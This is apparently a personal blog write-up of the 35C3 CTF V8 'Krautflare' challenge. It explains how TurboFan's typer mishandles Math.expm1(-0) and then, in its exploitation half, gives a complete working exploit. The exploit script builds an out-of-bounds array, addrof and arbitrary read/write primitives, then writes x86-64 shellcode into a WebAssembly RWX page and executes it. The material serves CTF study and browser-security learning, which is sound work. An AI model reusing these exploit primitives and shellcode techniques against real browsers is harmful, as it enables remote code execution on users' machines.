---
title: "expm1-35C3 - Bug/ Optimizations Analysis"
date: 2024-02-19
draft: false
tags: ["math.expm1", "typer", "OOB"]
---

In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process. 
<!--more-->
We'll break down how this edge case is misoptimized by V8's Turbofan compiler, explore the root cause of the issue, and demonstrate how this leads to unexpected behavior.

For context, we’ll focus on the technical aspects surrounding the typer phase and its consequences for browser exploitation. PS: This is more or less my notes, So if there is any errors/false observations please bear with it and ping me on discord (tourpran). 

## Background on Math.expm1
The `Math.expm1(x)` function calculates `e^x - 1` with improved precision for small values of `x`. For example:

- `Math.expm1(0)` returns `0`
- `Math.expm1(-0)` returns `-0`, due to the handling of signed zeros in JavaScript.

This distinction is significant in JavaScript, where `0` and `-0` behave differently in equality comparisons and mathematical operations. According to the ECMAScript specification, `Math.expm1(-0)` should return `-0`, but a bug in V8's optimization pipeline causes it to be incorrectly handled.

## Expected Behavior of Math.expm1(-0)
The ECMAScript spec mandates that `Math.expm1(-0)` must return `-0`. This behavior is critical when dealing with negative zero in JavaScript. Here’s why:

- `0` and `-0` are distinct values in JavaScript, despite being equal according to `==` and `===`.
- However, `Object.is(0, -0)` correctly returns `false`, recognizing the difference between the two.
When `Math.expm1(-0)` is mishandled during optimization, it leads to incorrect behavior in cases where signed zeros are important.

## Understanding the bug:
The typer processes the code by executing several phases:

- **Typer Phase**: Determines the types of various nodes in the graph.
- **TypeNarrowingReducer**: Eliminates unnecessary loads based on narrowed types.
- **Simplified Lowering Phase**: Applies further optimizations by lowering nodes into simpler operations.
In the case of `Math.expm1(-0)`, the result should always be `-0`. However, the `typer` mistakenly classifies the range as `(plainNumber, NaN)`, when in fact, `-0` is neither a `plain number` nor a `NaN`, leading to an incorrect assumption during `type analysis`.
![idek4](/images/math_expm_bug/image-3.png)

## Object.is()
### 1- Initial Phase:
- The `typer` assigns the `Object.is()` node as a `SameValue` node. This can be seen in [turbolizer](https://v8.github.io/tools/head/turbolizer/index.html).

![initial](/images/math_expm_bug/image.png)

### 2- Typed Optimization: 
- In this phase, `SameValue` is further reduced to `ObjectIsMinusZero()` when either side of the comparison involves `-0`. This makes comparisons more efficient by focusing on the specific case of `-0`.

```c++
else if (lhs_type.Is(Type::MinusZero())) {
    // SameValue(x:minus-zero,y) => ObjectIsMinusZero(y)
    node->RemoveInput(0);
    NodeProperties::ChangeOp(node, simplified()->ObjectIsMinusZero());
    return Changed(node);
  } else if (rhs_type.Is(Type::MinusZero())) {
    // SameValue(x,y:minus-zero) => ObjectIsMinusZero(x)
    node->RemoveInput(1);
    NodeProperties::ChangeOp(node, simplified()->ObjectIsMinusZero());
    return Changed(node);
  }
```

![idek1](/images/math_expm_bug/image-1.png)

### 3- Simplified Lowering:
- This phase further optimizes the `ObjectIsMinusZero()` node. If the input is confirmed to be `-0`, the node is simplified and deferred for replacement, enhancing overall efficiency.

```cpp
case IrOpcode::kObjectIsMinusZero: 
Type const input_type = GetUpperBound(node->InputAt(0));
if (input_type.Is(Type::MinusZero())) {
    VisitUnop(node, UseInfo::None(), MachineRepresentation::kBit);
    if (lower()) {
    DeferReplacement(node, lowering->jsgraph()->Int32Constant(1));
    }
}
```

## Patch and Bug Details:
- The `Math.expm1()` operation is incorrectly converted to a combination of `Float64Expm1` and `ChangeFloat64ToTagged`, which causes `-0` to be truncated to `0`.
- By using a `Call` node and invoking the inbuilt V8 `Math.expm1`, this truncation issue can be avoided.
- The patch has only been applied to `typer.cc` but not to `operation-typer`, allowing the creation of a `Call` node using V8 builtins to correctly handle `Math.expm1`, even though it still makes incorrect type assumptions.

![ide](/images/math_expm_bug/image-4.png)

This patch addresses the issue in `typer.cc`, but a more comprehensive solution requires changes in other parts of the type system to fully fix the handling of `-0` in `Math.expm1`.

## Pipeline of TurboFan:
![Pipeline of TurboFan](/images/math_expm_bug/image-5.png)

TurboFan’s pipeline consists of multiple phases that optimize and lower JavaScript code into highly optimized machine code. The key stages include type inference, node optimization (such as `SameValue` being converted to checks like `ObjectIsMinusZero`), and various lowering phases that simplify and optimize the code.

## Typer Phase:
- The typer traverses all the nodes in the intermediate representation (IR) and processes them through the GraphReducer.
- For each node, it attempts to assign the most accurate type information, optimizing how the node will be executed in subsequent phases.

## Type Lowering:
- This phase focuses on extensive optimizations, including refining operations and simplifying nodes for better performance in the backend stages of Turbofan.
![Type Lowering Phase](/images/math_expm_bug/image-7.png)

## Escape analysis:
```js
function f() {
  let o = {a: 5};
  return o.a;
}
```
> Clearly, it can be rewritten as:

```js
function f() {
  let 0. a = 5;
  return o_a;
}
```
[Great Video on Escape Analysis](https://www.youtube.com/watch?v=KiWEWLwQ3oI&ab_channel=NightHacking)

## Additional Optimizations
- If you're interested, you can find more information about V8 TurboFan's optimizations in the documentation [here](https://v8.dev/docs/turbofan).

## Exploitation:
- **Problem:** The `sameValue` variable is of boolean type, which leads to the type assumption of (0, 1337), resulting in no out-of-bounds (OOB) access.  
![bob](/images/math_expm_bug/image-8.png)  
![bob](/images/math_expm_bug/image-9.png)  

- As mentioned in the blog, we need to retain the `sameValue` node until the final optimization, folding it to `true`. This means the compiler shouldn't be aware that we're comparing with `-0` until the very last optimization step.  

- In escape analysis, we can replace -0 with `Object.is()`, and during simplified lowering, we achieve the desired range value, allowing us to remove the bounds check. The `assumed` return type becomes false, ensuring that it will always remain within the array limits.  

> #79: CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call)  [Static type: Range(0, 4), Feedback type: Range(0, 0)]  

![idekde](/images/math_expm_bug/image-10.png)  

## OOB Array Creation:
- By exploiting out-of-bounds (OOB) array access, we can leak the addresses of objects by keeping them close to a float array. After much trial and error, along with extensive monkey patching, I finally discovered a more effective method for achieving a memory leak.

```javascript
function addrof(x, i = 1) {
    let a = [1.1, 2.2, 3.3];
    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
    let o = { m: -0 };
    let t = Object.is(Math.expm1(x), o.m) + 0;
    t *= (i + 0); // Convert i to an integral type.
    let val = a[t];
    oob_rw_buffer = b;
    return val;
}
```

- Here, `a` is the array from which we want to access out-of-bounds values, while `b` is the array where we intend to manipulate the length field.  

- **Tricky Part:** The parameter `i` has an ambiguous type, so I added `0` to it to ensure it is treated as an integral type. This adjustment, along with the feedback, enables the OOB read. Silly JavaScript engine!  

- Finally, I'm storing the context of `b` in the `oob_rw_buffer`. Below is a rough illustration of the leak following the adjustment to the fixed array `a`.

**Leaks of the current state:**
```
3) int: 0x7a7e2501459
4) int: 0x500000000
5) int: 0x4016000000000000
6) int: 0x4016000000000000
7) int: 0x4016000000000000
8) int: 0x4016000000000000
9) int: 0x4016000000000000
10) int: 0x375928582cf9    - (map of b)
11) int: 0x7a7e2500c21     - (property of b)
12) int: 0x65ad13cc1c9     - (element backing pointer of b)
13) int: 0x500000000       - (length field)
14) int: 0x7a7e2500561
15) int: 0x8000000000000000
16) int: 0x3ff199999999999a
17) int: 0x3ff199999999999a
18) int: 0x3ff199999999999a
19) int: 0x3ff199999999999a
```

### Addrof Primitive:
- With the OOB array in place, having another array afterwards allows us to perform an OOB array read, thus enabling the creation of an `addrof` primitive.  

```js
let oob_rw_buffer = undefined;
let aux_arr = undefined;
function addrof(obj){
  aux_arr[0] = obj;
  return oob_rw_buffer[0x12];
}
function stagel(x, i=1){
  let a = [1.1, 2.2, 3.3];
  let b = [5.5, 5.5, 5.5, 5.5, 5.5];
  let c = [{}, 1, 2];
  let o = {m: -0};
  let t = Object.is(Math.expml(x), o.m) + 0;  // trigger the bug.
  t *= (i+0);                                 // i to inegral.
  a[t] = 1024*1024;
  oob_rw_buffer = b;                          // expose b to global scope
  aux arr = c;
  return 0;
}
```

### Arb Read / Arb Write:
- By storing the `ArrayBuffer` after all the allocations, we can calculate the offset difference between the `ArrayBuffer` and the OOB array. This enables us to perform arbitrary read and write operations.

```javascript
function arb_write(addr, val) {
    oob_rw_buffer[diff / 8n] = addr.i2f();
    dv.setBigUint64(0, val, true);
}
```

```javascript
function arb_read(addr) {
    oob_rw_buffer[diff / 8n] = addr.i2f();
    return dv.getBigUint64(0, true);
}
```

## Final Exploit:
> This is the final exploit I've developed, ready to target the V8 engine. However, to ensure reliability for Chrome, I need to correct the objects I corrupted and proceed with caution. If we manage to escape the Chrome sandbox, it’s game over.

```js
// ------------------------------------------------ Utility- Functions ------------------------------------------------ //
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
  return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
  int_view[0] = this;
  return float_view[0];
}
BigInt.prototype.smi2f = function() {
  int_view[0] = this << 32n;
  return float_view[0];
}
Number.prototype.f2i = function() {
  float_view[0] = this;
  return int_view[0];
}
Number.prototype.f2smi = function() {
  float_view[0] = this;
  return int_view[0] >> 32n;
}
Number.prototype.i2f = function() {
  return BigInt(this).i2f();
}
Number.prototype.smi2f = function() {
  return BigInt(this).smi2f();
}

// ----------------------------------------------- Starting the exploit ----------------------------------------------- //

let oob_rw_buffer = undefined;
let aux_arr = undefined;

function addrof(obj){
    aux_arr[0] = obj;
    return oob_rw_buffer[0x12];
}

function stage1(x, i=1){
    let a = [1.1, 2.2, 3.3];
    let b = [5.5, 5.5, 5.5, 5.5, 5.5];
    let c = [{}, 1, 2];
    let o = {m: -0};
    let t = Object.is(Math.expm1(x), o.m) + 0; // trigger the bug.
    t *= (i+0); // i to inegral.
    a[t] = 1024*1024;
    oob_rw_buffer = b; // expose b to global scope
    aux_arr = c;
    return 0;
  }

stage1(0);
for(let i=0;i<100000;i++){
    stage1("0");
}
stage1(-0, 13); // get the OOB array.
console.log("[+] Stage 1: Obtained a OOB array");

// Stage 2
function arb_write(addr, val){
  oob_rw_buffer[diff/8n] = addr.i2f();
  dv.setUint32(0, val, true);
}

function arb_read(addr){
  oob_rw_buffer[diff/8n] = addr.i2f();
  return dv.getBigUint64(0, true);
}

function shell_write(addr, shellcode){
  for(let i=0;i<shellcode.length;i++){
    arb_write(addr+BigInt(4*i), shellcode[i]);
  }
}
let buf = new ArrayBuffer(0x100);
let dv = new DataView(buf);

buf_addr = addrof(buf).f2i();
oob_addr = addrof(oob_rw_buffer).f2i();
let diff = buf_addr-oob_addr+72n; //from the OOB array to array buffer 

console.log("[+] ArrayBuffer addr: " + buf_addr.hex());
console.log("[+] Offset btw oob and arraybuffer: " + diff);


// wasm for RWS shellcode
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var func = wasmInstance.exports.main;

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

rwx = arb_read(addrof(wasmInstance).f2i() +0x00e8n -1n);
console.log("[+] Got the Address of RWX segment: " + rwx.hex());
shell_write(rwx, shellcode);
func(); 
```

To get the follow files, you can visit [here](https://github.com/tourpran/pwn-hub/tree/main/v8-exp/expm1-35C3).

## Debugging Tools:
- The helper code for GDB can be found in `src/objects-printer.cc`.
- The node structure comprises a variety of methods, including:
  - **Methods:**
    - `new`, `clone`, `isDead`, `kill`, etc.
  - **Variables:**
    - Includes operation descriptions (e.g., `opcode` related) and properties.

- Use the following flags for additional insights:
  - `--trace-turbo`: Generates the Turbolizer graph.
  - `--trace-representation`: Provides feedback types and information about each optimization phase.

## Useful Links:
- [Exploiting Math.expm1 in V8](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8)
- [Krautflare: A Deep Dive](https://www.jaybosamiya.com/blog/2019/01/02/krautflare/)